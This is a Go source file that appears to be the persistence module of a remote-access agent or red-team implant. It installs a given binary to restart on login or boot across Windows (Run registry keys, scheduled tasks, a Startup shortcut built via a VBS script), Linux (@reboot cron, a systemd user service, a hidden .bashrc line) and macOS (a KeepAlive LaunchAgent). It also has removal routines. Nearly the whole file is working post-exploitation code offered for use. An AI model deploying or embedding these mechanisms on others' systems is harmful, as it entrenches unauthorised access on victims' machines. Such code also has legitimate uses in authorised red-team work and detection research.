package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// normalizeMethod converts method aliases to standard method names
func normalizeMethod(method string) string {
	// Method aliases mapping
	methodMap := map[string]string{
		// Windows aliases
		"registry":  "registry_run",
		"reg":       "registry_run",
		"run":       "registry_run",
		"schtask":   "schtasks_onlogon",
		"task":      "schtasks_onlogon",
		"scheduled": "schtasks_onlogon",
		"startup":   "startup_folder",
		"folder":    "startup_folder",

		// Linux aliases
		"cron":    "cron_reboot",
		"systemd": "systemd_user",
		"service": "systemd_user",
		"bash":    "bashrc",
		"shell":   "bashrc",

		// macOS aliases
		"launch": "launchagent",
		"agent":  "launchagent",
		"plist":  "launchagent",
	}

	// Return mapped method or original if no mapping exists
	if normalized, exists := methodMap[strings.ToLower(method)]; exists {
		return normalized
	}
	return method
}

// SetupPersistence configures persistence mechanism
func SetupPersistence(method, name, agentPath string, args []string) error {
	// Normalize the method name
	normalizedMethod := normalizeMethod(method)

	fmt.Printf("[*] Setting up persistence: method=%s (normalized from %s), name=%s, path=%s\n",
		normalizedMethod, method, name, agentPath)

	switch runtime.GOOS {
	case "windows":
		return setupWindowsPersistence(normalizedMethod, name, agentPath, args)
	case "linux":
		return setupLinuxPersistence(normalizedMethod, name, agentPath, args)
	case "darwin":
		return setupMacOSPersistence(normalizedMethod, name, agentPath, args)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// RemovePersistence removes persistence mechanism
func RemovePersistence(method, name string) error {
	// Normalize the method name
	normalizedMethod := normalizeMethod(method)

	fmt.Printf("[*] Removing persistence: method=%s (normalized from %s), name=%s\n",
		normalizedMethod, method, name)

	switch runtime.GOOS {
	case "windows":
		return removeWindowsPersistence(normalizedMethod, name)
	case "linux":
		return removeLinuxPersistence(normalizedMethod, name)
	case "darwin":
		return removeMacOSPersistence(normalizedMethod, name)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// Windows Persistence Methods
func setupWindowsPersistence(method, name, agentPath string, args []string) error {
	fmt.Printf("[*] Windows persistence setup: method=%s\n", method)

	switch method {
	case "registry_run":
		return setupRegistryRun(name, agentPath, args)
	case "schtasks_onlogon":
		return setupScheduledTask(name, agentPath, args, "ONLOGON")
	case "schtasks_daily":
		return setupScheduledTask(name, agentPath, args, "DAILY")
	case "startup_folder":
		return setupStartupFolder(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder", method)
	}
}

func removeWindowsPersistence(method, name string) error {
	fmt.Printf("[*] Windows persistence removal: method=%s\n", method)

	switch method {
	case "registry_run":
		return removeRegistryRun(name)
	case "schtasks_onlogon", "schtasks_daily":
		return removeScheduledTask(name)
	case "startup_folder":
		return removeStartupFolder(name)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder", method)
	}
}

func setupRegistryRun(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up registry run persistence: %s\n", name)

	value := fmt.Sprintf("\"%s\"", agentPath)
	if len(args) > 0 {
		value += " " + strings.Join(args, " ")
	}

	// Try HKCU first (user level)
	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/t", "REG_SZ",
		"/d", value,
		"/f")

	if output, err := cmd.CombinedOutput(); err != nil {
		fmt.Printf("[!] HKCU registry add failed: %v - %s\n", err, output)

		// Try HKLM if HKCU fails and we have admin rights
		cmd = exec.Command("reg", "add",
			"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", name,
			"/t", "REG_SZ",
			"/d", value,
			"/f")

		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to add registry key to both HKCU and HKLM: %v - %s", err, output)
		}
		fmt.Printf("[+] Registry persistence added to HKLM\n")
	} else {
		fmt.Printf("[+] Registry persistence added to HKCU\n")
	}

	return nil
}

func removeRegistryRun(name string) error {
	fmt.Printf("[*] Removing registry run persistence: %s\n", name)

	// Try removing from HKCU first
	cmd := exec.Command("reg", "delete",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/f")

	if output, err := cmd.CombinedOutput(); err != nil {
		fmt.Printf("[!] HKCU registry delete failed: %v - %s\n", err, output)

		// Try HKLM
		cmd = exec.Command("reg", "delete",
			"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", name,
			"/f")

		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to remove registry key from both HKCU and HKLM: %v - %s", err, output)
		}
		fmt.Printf("[+] Registry persistence removed from HKLM\n")
	} else {
		fmt.Printf("[+] Registry persistence removed from HKCU\n")
	}

	return nil
}

func setupScheduledTask(name, agentPath string, args []string, schedule string) error {
	fmt.Printf("[*] Setting up scheduled task: %s (%s)\n", name, schedule)

	cmdArgs := []string{
		"/create",
		"/tn", name,
		"/tr", fmt.Sprintf("\"%s\" %s", agentPath, strings.Join(args, " ")),
		"/sc", schedule,
		"/f",
	}

	if schedule == "DAILY" {
		cmdArgs = append(cmdArgs, "/st", "09:00")
	}

	cmd := exec.Command("schtasks", cmdArgs...)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create scheduled task: %v - %s", err, output)
	}

	fmt.Printf("[+] Scheduled task created successfully\n")
	return nil
}

func removeScheduledTask(name string) error {
	fmt.Printf("[*] Removing scheduled task: %s\n", name)

	cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to remove scheduled task: %v - %s", err, output)
	}

	fmt.Printf("[+] Scheduled task removed successfully\n")
	return nil
}

func setupStartupFolder(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up startup folder persistence: %s\n", name)

	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")

	// Create VBS script to create shortcut
	vbsContent := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
Set objShortcut = objShell.CreateShortcut("%s")
objShortcut.TargetPath = "%s"
objShortcut.Arguments = "%s"
objShortcut.WorkingDirectory = "%s"
objShortcut.Save
`, startupPath, agentPath, strings.Join(args, " "), filepath.Dir(agentPath))

	vbsPath := filepath.Join(os.TempDir(), "create_shortcut.vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return fmt.Errorf("failed to create VBS script: %v", err)
	}
	defer os.Remove(vbsPath)

	cmd := exec.Command("cscript", "/nologo", vbsPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create startup shortcut: %v - %s", err, output)
	}

	fmt.Printf("[+] Startup folder persistence created successfully\n")
	return nil
}

func removeStartupFolder(name string) error {
	fmt.Printf("[*] Removing startup folder persistence: %s\n", name)

	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")

	if err := os.Remove(startupPath); err != nil {
		return fmt.Errorf("failed to remove startup shortcut: %v", err)
	}

	fmt.Printf("[+] Startup folder persistence removed successfully\n")
	return nil
}

// Linux Persistence Methods
func setupLinuxPersistence(method, name, agentPath string, args []string) error {
	fmt.Printf("[*] Linux persistence setup: method=%s\n", method)

	switch method {
	case "cron_reboot":
		return setupCronReboot(name, agentPath, args)
	case "systemd_user":
		return setupSystemdUser(name, agentPath, args)
	case "bashrc":
		return setupBashrc(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s. Available: cron_reboot, systemd_user, bashrc", method)
	}
}

func removeLinuxPersistence(method, name string) error {
	fmt.Printf("[*] Linux persistence removal: method=%s\n", method)

	switch method {
	case "cron_reboot":
		return removeCronReboot(name)
	case "systemd_user":
		return removeSystemdUser(name)
	case "bashrc":
		return removeBashrc(name)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s. Available: cron_reboot, systemd_user, bashrc", method)
	}
}

func setupCronReboot(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up cron reboot persistence: %s\n", name)

	cronLine := fmt.Sprintf("@reboot %s %s # %s", agentPath, strings.Join(args, " "), name)

	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()

	// Add new line
	newCron := string(output) + cronLine + "\n"

	// Write back
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to update crontab: %v", err)
	}

	fmt.Printf("[+] Cron persistence added successfully\n")
	return nil
}

func removeCronReboot(name string) error {
	fmt.Printf("[*] Removing cron reboot persistence: %s\n", name)

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to read crontab: %v", err)
	}

	// Remove line with name
	lines := strings.Split(string(output), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, "# "+name) {
			newLines = append(newLines, line)
		}
	}

	// Write back
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(strings.Join(newLines, "\n"))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to update crontab: %v", err)
	}

	fmt.Printf("[+] Cron persistence removed successfully\n")
	return nil
}

func setupSystemdUser(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up systemd user service: %s\n", name)

	serviceContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, name, agentPath, strings.Join(args, " "))

	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")

	// Create directory
	os.MkdirAll(filepath.Dir(servicePath), 0755)

	// Write service file
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("failed to write service file: %v", err)
	}

	// Reload and enable
	exec.Command("systemctl", "--user", "daemon-reload").Run()
	if err := exec.Command("systemctl", "--user", "enable", name).Run(); err != nil {
		return fmt.Errorf("failed to enable service: %v", err)
	}

	if err := exec.Command("systemctl", "--user", "start", name).Run(); err != nil {
		return fmt.Errorf("failed to start service: %v", err)
	}

	fmt.Printf("[+] Systemd user service created and started successfully\n")
	return nil
}

func removeSystemdUser(name string) error {
	fmt.Printf("[*] Removing systemd user service: %s\n", name)

	exec.Command("systemctl", "--user", "stop", name).Run()
	exec.Command("systemctl", "--user", "disable", name).Run()

	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")
	if err := os.Remove(servicePath); err != nil {
		return fmt.Errorf("failed to remove service file: %v", err)
	}

	exec.Command("systemctl", "--user", "daemon-reload").Run()

	fmt.Printf("[+] Systemd user service removed successfully\n")
	return nil
}

func setupBashrc(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up bashrc persistence: %s\n", name)

	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")

	// Read current bashrc
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return fmt.Errorf("failed to read bashrc: %v", err)
	}

	// Add persistence line
	persistLine := fmt.Sprintf("\n# %s\n(%s %s &) 2>/dev/null\n",
		name, agentPath, strings.Join(args, " "))

	// Append to bashrc
	if err := os.WriteFile(bashrcPath, append(content, []byte(persistLine)...), 0644); err != nil {
		return fmt.Errorf("failed to update bashrc: %v", err)
	}

	fmt.Printf("[+] Bashrc persistence added successfully\n")
	return nil
}

func removeBashrc(name string) error {
	fmt.Printf("[*] Removing bashrc persistence: %s\n", name)

	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")

	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return fmt.Errorf("failed to read bashrc: %v", err)
	}

	// Remove lines containing the name
	lines := strings.Split(string(content), "\n")
	var newLines []string
	skip := false
	for _, line := range lines {
		if strings.Contains(line, "# "+name) {
			skip = true
			continue
		}
		if skip && strings.TrimSpace(line) == "" {
			skip = false
			continue
		}
		if !skip {
			newLines = append(newLines, line)
		}
	}

	if err := os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		return fmt.Errorf("failed to update bashrc: %v", err)
	}

	fmt.Printf("[+] Bashrc persistence removed successfully\n")
	return nil
}

// macOS Persistence Methods
func setupMacOSPersistence(method, name, agentPath string, args []string) error {
	fmt.Printf("[*] macOS persistence setup: method=%s\n", method)

	switch method {
	case "launchagent":
		return setupLaunchAgent(name, agentPath, args)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s. Available: launchagent", method)
	}
}

func removeMacOSPersistence(method, name string) error {
	fmt.Printf("[*] macOS persistence removal: method=%s\n", method)

	switch method {
	case "launchagent":
		return removeLaunchAgent(name)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s. Available: launchagent", method)
	}
}

func setupLaunchAgent(name, agentPath string, args []string) error {
	fmt.Printf("[*] Setting up launch agent: %s\n", name)

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>`, name, agentPath)

	for _, arg := range args {
		plistContent += fmt.Sprintf("\n        <string>%s</string>", arg)
	}

	plistContent += `
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`

	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")

	// Create directory
	os.MkdirAll(filepath.Dir(plistPath), 0755)

	// Write plist
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return fmt.Errorf("failed to write plist: %v", err)
	}

	// Load agent
	if err := exec.Command("launchctl", "load", plistPath).Run(); err != nil {
		return fmt.Errorf("failed to load launch agent: %v", err)
	}

	fmt.Printf("[+] Launch agent created and loaded successfully\n")
	return nil
}

func removeLaunchAgent(name string) error {
	fmt.Printf("[*] Removing launch agent: %s\n", name)

	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")

	// Unload agent
	exec.Command("launchctl", "unload", plistPath).Run()

	// Remove plist
	if err := os.Remove(plistPath); err != nil {
		return fmt.Errorf("failed to remove plist: %v", err)
	}

	fmt.Printf("[+] Launch agent removed successfully\n")
	return nil
}
